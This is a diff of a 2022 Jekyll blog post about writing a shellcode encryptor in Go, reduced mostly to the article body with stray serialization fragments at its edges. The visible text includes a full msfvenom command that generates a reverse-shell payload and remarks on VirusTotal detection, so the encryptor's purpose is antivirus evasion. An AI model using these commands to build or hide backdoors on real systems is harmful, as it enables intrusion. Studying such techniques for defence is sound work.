@@ -1,56 +1,4 @@
-<!DOCTYPE html>
-<html>
-<head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
-  <meta name="generator" content="Jekyll">
-
-  <title>Writing a Custom Shellcoder Encrypter - First Post by Zero++;</title>
-
-  <link rel="stylesheet" href="/css/main.css">
-  
-  <link href="/atom.xml" type="application/atom+xml" rel="alternate" title="ATOM Feed" /> <!-- Begin Jekyll SEO tag v2.8.0 -->
-<title>Writing a Custom Shellcoder Encrypter - First Post by Zero++; | Zero++; - Blog</title>
-<meta name="generator" content="Jekyll v4.2.2" />
-<meta property="og:title" content="Writing a Custom Shellcoder Encrypter - First Post by Zero++;" />
-<meta name="author" content="Zero++;" />
-<meta property="og:locale" content="en_US" />
-<meta name="description" content="In this blogpost we will write an custom Shellcode Cryptor in go." />
-<meta property="og:description" content="In this blogpost we will write an custom Shellcode Cryptor in go." />
-<link rel="canonical" href="http://localhost:4000/Test-Post" />
-<meta property="og:url" content="http://localhost:4000/Test-Post" />
-<meta property="og:site_name" content="Zero++; - Blog" />
-<meta property="og:type" content="article" />
-<meta property="article:published_time" content="2022-09-18T00:00:00+02:00" />
-<meta name="twitter:card" content="summary" />
-<meta property="twitter:title" content="Writing a Custom Shellcoder Encrypter - First Post by Zero++;" />
-<script type="application/ld+json">
-{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"Zero++;","url":"calloczero.github.io"},"dateModified":"2022-09-18T00:00:00+02:00","datePublished":"2022-09-18T00:00:00+02:00","description":"In this blogpost we will write an custom Shellcode Cryptor in go.","headline":"Writing a Custom Shellcoder Encrypter - First Post by Zero++;","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/Test-Post"},"url":"http://localhost:4000/Test-Post"}</script>
-<!-- End Jekyll SEO tag -->
-
-</head>
-
-<body>
-  <div id="wrapper">
-    <header>
-  <div>
-    <a href="/">
-    
-    <h1>zero++;@home:~$</h1>
-    </a>
-    <div class="header-links">
-      <a href="/archive"><h2 class="header-link">Archive</h2></a>
-<a href="/about"><h2 class="header-link">About</h2></a>
-<a href="/atom.xml"><h2 class="header-link">RSS</h2></a>
-    </div>
-  </div>
-</header>
-    <div class="container">
-      <section id="main_content">
-        <article>
-  <h2>Writing a Custom Shellcoder Encrypter - First Post by Zero++;</h2>
-  <time datetime="2022-09-18T00:00:00+02:00" class="by-line">18 Sep 2022</time>
-  <p>In this blogpost we will write an custom Shellcode Cryptor in go.</p>
+I"s"<p>In this blogpost we will write an custom Shellcode Cryptor in go.</p>
 
 <h2 id="but-what-exactly-is-shellcode">But what exactly is Shellcode?</h2>
 <p>Shellcode is a combination of binary instruction that will be executed on cpu.
@@ -140,25 +88,6 @@ To run the Shellcode you have todo the same as before, just copy the output, pas
 <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msfvenom -p linux/x86/shell/reverse_tcp LHOST=127.0.0.1 LPORT=8089 -b "\x00" -f c -o raw.txt 
 </code></pre></div></div>
 <p>For some reason msfvenom used shikata_ga_nai, but i didnt specify to use it which was really suprising for me. If we now upload the backdoor to VirusTotal it will be detected.
-<img src="images/crp.png" alt="Drag Racing" /></p>
+<img src="https://github.com/calloczero/calloczero.github.io/blob/main/_posts/images/crop.png" alt="Virus Total Screenshot here" /></p>
 
-
-</article>
-      </section>
-    </div>
-  </div>
-
-   <footer>
-  <a href="https://creativecommons.org/licenses/by-nc/3.0/deed.en_US">
-    <span>
-        <b>Zero++;</b>
-    </span>
-    
-    <span>© 2022</span>
-  </a>
-</footer>
-
-  
-</body>
-
-</html>
+:ET
